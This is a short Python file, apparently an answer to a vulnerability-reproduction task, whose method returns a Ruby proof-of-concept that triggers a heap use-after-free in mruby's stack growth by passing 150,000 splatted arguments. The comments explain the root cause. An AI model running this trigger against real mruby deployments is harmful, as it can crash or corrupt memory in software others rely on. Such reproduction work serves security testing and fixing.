import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is a Heap Use-After-Free in mruby's stack management.
        # It occurs when mrb_stack_extend is called to grow the VM stack (e.g., when pushing many arguments),
        # but the 'regs' pointer (pointing to the current stack frame) is not updated, leading to access of freed memory.
        #
        # To trigger this, we construct a Ruby script that calls a method with a very large number of arguments
        # using the splat operator (*). This forces the VM to expand the stack dynamically during the call setup.
        
        # We use a large array size (150,000) to ensure stack reallocation occurs.
        # The exact size needed depends on the initial stack capacity, but this is sufficiently large.
        
        poc = (
            b"def f(*args)\n"
            b"end\n"
            b"a = [0] * 150000\n"
            b"f(*a)\n"
        )
        return poc